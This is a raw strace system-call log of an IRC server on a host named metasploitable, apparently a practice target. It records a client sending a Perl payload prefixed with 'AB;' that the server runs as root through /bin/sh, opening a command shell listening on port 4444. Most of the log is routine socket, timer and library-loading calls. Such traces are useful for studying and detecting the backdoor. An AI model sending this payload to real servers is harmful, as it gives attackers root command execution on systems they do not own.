4519  07:18:52.818509 select(1024, [2 3 4 7 9], [], NULL, {0, 430000}) = 1 (in [9], left {0, 290000})
4519  07:18:52.955950 clock_gettime(CLOCK_MONOTONIC, {1542, 772976241}) = 0
4519  07:18:52.955981 recv(9, "PRIVMSG  #testit3 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:18:52.956024 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956052 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956076 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956099 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956120 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956142 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956165 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956187 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956208 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956230 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956252 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956274 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956296 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956317 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956350 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956372 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956394 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956415 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956437 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956459 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956481 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956502 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.956528 gettimeofday({1495624732, 956534}, NULL) = 0
4519  07:18:52.956546 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 970000})
4519  07:18:52.985989 clock_gettime(CLOCK_MONOTONIC, {1542, 803008933}) = 0
4519  07:18:52.986010 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  07:18:52.986034 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986051 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986065 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986079 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986092 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986106 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986119 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986132 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986145 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986158 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986171 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986184 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986197 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986210 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986223 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986246 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986260 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986273 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986286 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986300 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986313 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986355 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:52.986372 time(NULL)        = 1495624732
4519  07:18:52.986382 time(NULL)        = 1495624732
4519  07:18:52.986410 gettimeofday({1495624732, 986414}, NULL) = 0
4519  07:18:52.986421 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:18:52.986449 clock_gettime(CLOCK_MONOTONIC, {1542, 803462409}) = 0
4519  07:18:52.986460 gettimeofday({1495624732, 986463}, NULL) = 0
4519  07:18:52.986470 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:18:52.989774 clock_gettime(CLOCK_MONOTONIC, {1542, 806790372}) = 0
4519  07:18:52.989789 accept(2, 0, NULL) = 5
4519  07:18:52.989810 getpeername(5, {sa_family=AF_INET, sin_port=htons(33703), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:18:52.989869 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:18:52.989884 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:18:52.989914 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:18:52.989940 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:18:52.989952 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:18:52.989962 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:18:52.989975 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:18:52.989991 clock_gettime(CLOCK_MONOTONIC, {1542, 807004129}) = 0
4519  07:18:52.990002 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:18:52.990014 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:18:52.990024 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:18:52.990033 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:18:52.990042 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:18:52.990058 send(6, "\220N\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:18:52.990158 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:18:52.990281 gettimeofday({1495624732, 990288}, NULL) = 0
4519  07:18:52.990311 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 990000})
4519  07:18:52.996484 clock_gettime(CLOCK_MONOTONIC, {1542, 813502443}) = 0
4519  07:18:52.996522 recvfrom(6, "\220N\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\353\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:18:52.996578 close(6)          = 0
4519  07:18:52.996595 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:18:52.996610 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:18:52.996669 time(NULL)        = 1495624732
4519  07:18:52.996682 time(NULL)        = 1495624732
4519  07:18:52.996694 gettimeofday({1495624732, 996698}, NULL) = 0
4519  07:18:52.996706 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:18:52.996735 clock_gettime(CLOCK_MONOTONIC, {1542, 813748435}) = 0
4519  07:18:52.996746 gettimeofday({1495624732, 996749}, NULL) = 0
4519  07:18:52.996756 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 790000})
4519  07:18:53.207015 clock_gettime(CLOCK_MONOTONIC, {1543, 24048745}) = 0
4519  07:18:53.207056 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:18:53.207082 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207100 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207114 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207128 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207141 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207155 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207168 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207182 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207194 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207208 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207221 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207234 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207247 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207260 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207273 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207286 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207299 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207312 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207325 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207339 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207352 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207380 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 220000}, ...}) = 0
4519  07:18:53.207440 gettimeofday({1495624733, 207444}, NULL) = 0
4519  07:18:53.207452 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:18:53.207495 clock_gettime(CLOCK_MONOTONIC, {1543, 24508697}) = 0
4519  07:18:53.207508 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:18:53.207549 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:18:53.207569 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:18:53.207581 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:18:53.207595 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 7462
7462  07:18:53.207662 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
7462  07:18:53.207677 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
7462  07:18:53.207687 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7462  07:18:53.207701 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
7462  07:18:53.207808 brk(0)            = 0x80f9000
7462  07:18:53.207831 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7462  07:18:53.207850 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f0f000
7462  07:18:53.207900 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
7462  07:18:53.207969 open("/etc/ld.so.cache", O_RDONLY) = 1
7462  07:18:53.207999 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7462  07:18:53.208021 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f07000
7462  07:18:53.208032 close(1)          = 0
7462  07:18:53.208042 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7462  07:18:53.208057 open("/lib/libncurses.so.5", O_RDONLY) = 1
7462  07:18:53.208071 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
7462  07:18:53.208163 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
7462  07:18:53.208181 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ed7000
7462  07:18:53.208192 mmap2(0xb7f04000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f04000
7462  07:18:53.208208 close(1)          = 0
7462  07:18:53.208220 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7462  07:18:53.208234 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
7462  07:18:53.208247 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
7462  07:18:53.208335 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
7462  07:18:53.208351 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ed3000
7462  07:18:53.208392 mmap2(0xb7ed5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7ed5000
7462  07:18:53.208426 close(1)          = 0
7462  07:18:53.208437 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7462  07:18:53.208451 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
7462  07:18:53.208465 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
7462  07:18:53.208556 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
7462  07:18:53.208572 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ed2000
7462  07:18:53.208586 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d83000
7462  07:18:53.208597 mmap2(0xb7ecc000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ecc000
7462  07:18:53.208611 mmap2(0xb7ecf000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ecf000
7462  07:18:53.208624 close(1)          = 0
7462  07:18:53.208648 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d82000
7462  07:18:53.208660 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d826b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
7462  07:18:53.208715 mprotect(0xb7ecc000, 4096, PROT_READ) = 0
7462  07:18:53.208750 munmap(0xb7f07000, 29913) = 0
7462  07:18:53.208775 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7462  07:18:53.208788 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
7462  07:18:53.208807 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8b6270) = -1 ENOTTY (Inappropriate ioctl for device)
7462  07:18:53.208849 brk(0)            = 0x80f9000
7462  07:18:53.208860 brk(0x80fa000)    = 0x80fa000
7462  07:18:53.208896 brk(0x80fb000)    = 0x80fb000
7462  07:18:53.208941 getuid32()        = 0
7462  07:18:53.208951 getgid32()        = 0
7462  07:18:53.208959 geteuid32()       = 0
7462  07:18:53.208968 getegid32()       = 0
7462  07:18:53.208981 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7462  07:18:53.208995 time(NULL)        = 1495624733
7462  07:18:53.209007 brk(0x80fc000)    = 0x80fc000
7462  07:18:53.209022 brk(0x80fd000)    = 0x80fd000
7462  07:18:53.209040 open("/proc/meminfo", O_RDONLY) = 1
7462  07:18:53.209062 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
7462  07:18:53.209079 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f0e000
7462  07:18:53.209090 read(1, "MemTotal:      1035240 kB\nMemFree:        555288 kB\nBuffers:         64788 kB\nCached:         258356 kB\nSwapCached:          0 kB\nActive:         254072 kB\nInactive:       198040 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        555048 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4708 kB\nWriteback:           0 kB\nAnonPages:      128968 kB\nMapped:          51968 kB\nSlab:            16568 kB\nSReclaimable:     8384 kB\nSUnreclaim:       8184 kB\nPageTables:       1952 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
7462  07:18:53.209173 close(1)          = 0
7462  07:18:53.209184 munmap(0xb7f0e000, 4096) = 0
7462  07:18:53.209195 brk(0x80fe000)    = 0x80fe000
7462  07:18:53.209221 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
7462  07:18:53.209234 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
7462  07:18:53.209249 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
7462  07:18:53.209261 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
7462  07:18:53.209273 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
7462  07:18:53.209284 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
7462  07:18:53.209297 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7462  07:18:53.209309 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
7462  07:18:53.209321 uname({sys="Linux", node="metasploitable", ...}) = 0
7462  07:18:53.209417 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
7462  07:18:53.209435 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
7462  07:18:53.209453 brk(0x8100000)    = 0x8100000
7462  07:18:53.209465 getcwd("/etc/unreal", 4096) = 12
7462  07:18:53.209479 getpid()          = 7462
7462  07:18:53.209495 getppid()         = 4519
7462  07:18:53.209511 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
7462  07:18:53.209530 stat64("/sbin/sh", 0xbf8b6248) = -1 ENOENT (No such file or directory)
7462  07:18:53.209542 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
7462  07:18:53.209559 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
7462  07:18:53.209582 socket(PF_FILE, SOCK_STREAM, 0) = 1
7462  07:18:53.209596 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
7462  07:18:53.209607 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
7462  07:18:53.209629 close(1)          = 0
7462  07:18:53.209640 socket(PF_FILE, SOCK_STREAM, 0) = 1
7462  07:18:53.209650 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
7462  07:18:53.209660 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
7462  07:18:53.209677 close(1)          = 0
7462  07:18:53.209690 open("/etc/nsswitch.conf", O_RDONLY) = 1
